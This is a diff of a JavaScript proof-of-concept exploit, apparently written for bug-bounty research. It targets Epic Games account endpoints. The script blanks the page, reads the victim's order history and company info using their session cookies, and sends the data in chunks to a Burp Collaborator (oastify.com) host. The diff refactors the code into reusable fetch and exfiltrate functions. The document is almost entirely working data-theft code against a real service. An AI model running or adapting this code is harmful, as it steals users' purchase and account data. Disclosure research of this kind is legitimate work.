@@ -1,50 +1,55 @@
 (async () => {
-  // Make the page blank and keep it blank
   document.documentElement.innerHTML = "";
   document.body = document.createElement("body");
   document.body.style.cssText = "margin:0;padding:0;background:#fff;";
 
-  alert("POC Example: Orders Info Stolen");
+  alert("POC Example: Orders & Company Info Stolen");
 
-  try {
-    console.log("Fetching full response...");
+  const collab = "https://ffyv5sxym8fbiwkpvkgkgjevvm1dp4tsi.oastify.com";
 
-    const res = await fetch("https://www.epicgames.com/account/v2/payment/ajaxGetOrderHistory?sortDir=DESC&sortBy=DATE&locale=en-US", {
-      credentials: "include"
-    });
-
-    if (!res.ok) {
-      console.error(`Failed to fetch, status: ${res.status}`);
-      return;
-    }
-
+  async function fetchFull(url) {
+    const res = await fetch(url, { credentials: "include" });
+    if (!res.ok) throw new Error(`Failed: ${res.status}`);
     const reader = res.body.getReader();
     let chunks = [];
     let receivedLength = 0;
-
     while (true) {
       const { done, value } = await reader.read();
       if (done) break;
       chunks.push(value);
       receivedLength += value.length;
     }
-
     let fullBody = new Uint8Array(receivedLength);
     let position = 0;
     for (let chunk of chunks) {
       fullBody.set(chunk, position);
       position += chunk.length;
     }
+    return new TextDecoder("utf-8").decode(fullBody);
+  }
 
-    const result = new TextDecoder("utf-8").decode(fullBody);
-    console.log("Full data received");
-
-    // Split the data to avoid URL length limits (~2000 chars per request)
+  async function exfiltrate(label, data) {
     const chunkSize = 1900;
-    for (let i = 0; i < result.length; i += chunkSize) {
-      const part = result.slice(i, i + chunkSize);
-      await fetch(`https://ffyv5sxym8fbiwkpvkgkgjevvm1dp4tsi.oastify.com?data=${encodeURIComponent(part)}`);
+    for (let i = 0; i < data.length; i += chunkSize) {
+      const part = data.slice(i, i + chunkSize);
+      await fetch(`${collab}?label=${label}&data=${encodeURIComponent(part)}`);
     }
+  }
+
+  try {
+    // Exfiltrate Order History
+    const orders = await fetchFull(
+      "https://www.epicgames.com/account/v2/payment/ajaxGetOrderHistory?sortDir=DESC&sortBy=DATE&locale=en-US"
+    );
+    await exfiltrate("orders", orders);
+    console.log("Order history exfiltrated");
+
+    // Exfiltrate Company Info
+    const companyInfo = await fetchFull(
+      "https://www.epicgames.com/account/v2/company-info"
+    );
+    await exfiltrate("company-info", companyInfo);
+    console.log("Company info exfiltrated");
 
     console.log("All data sent to Burp Collaborator");
   } catch (error) {
